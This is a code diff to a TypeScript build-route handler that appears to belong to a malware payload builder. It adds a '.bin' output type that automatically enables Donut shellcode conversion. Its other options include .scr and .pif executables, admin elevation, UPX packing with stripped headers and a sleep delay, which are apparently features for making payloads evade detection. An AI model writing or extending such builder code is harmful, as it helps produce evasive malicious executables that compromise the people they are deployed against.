@@ -172,10 +172,12 @@ export async function handleBuildRoutes(
         ? iconBase64
         : undefined;
       const safeRequireAdmin = !!requireAdmin;
-      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com", ".jar"]);
+      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com", ".jar", ".bin"]);
       const safeOutputExtension =
         typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
           ? outputExtension.toLowerCase() : ".exe";
+      // .bin means Donut shellcode output — auto-enable Donut
+      const effectiveEnableDonut = !!enableDonut || safeOutputExtension === ".bin";
       const safeSleepSeconds =
         typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
           ? sleepSeconds : 0;
@@ -271,7 +273,7 @@ export async function handleBuildRoutes(
         iconBase64: safeIconBase64,
         enableUpx: !!enableUpx,
         upxStripHeaders: !!upxStripHeaders,
-        enableDonut: !!enableDonut,
+        enableDonut: effectiveEnableDonut,
         enableTyphon: !!enableTyphon,
         typhonVariant: !!enableTyphon ? safeTyphonVariant : undefined,
         enableVault: !!enableVault,
